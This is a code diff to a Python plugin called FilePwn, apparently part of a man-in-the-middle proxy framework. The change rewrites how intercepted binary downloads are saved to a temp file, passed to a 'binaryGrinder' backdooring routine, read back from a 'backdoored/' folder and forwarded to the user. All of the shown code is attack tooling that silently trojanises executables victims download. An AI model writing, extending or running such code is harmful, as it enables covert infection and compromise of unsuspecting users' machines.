@@ -278,9 +278,18 @@ class FilePwn(Plugin):
             return {'request':request,'data':bd_zip}
 
         elif content_header in self.binaryMimeTypes:
-            print "[+] Detected supported binary type!"
-            bd_binary = self.binaryGrinder(data)
-            return {'request':request,'data':bd_binary}
+            print "[+] Detected supported binary type!"   
+            fd, tmpFile = mkstemp()
+            with open(tmpFile, 'w') as f:
+                f.write(data)
+            
+            patchb = self.binaryGrinder(tmpFile)
+
+            if patchb:
+                bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
+                os.remove('./backdoored/' + os.path.basename(tmpFile))
+                print "[*] Patching complete, forwarding to user."
+                return {'request':request,'data':bd_binary}
 
         else:
             print "[-] File is not of supported Content-Type: %s" % content_header
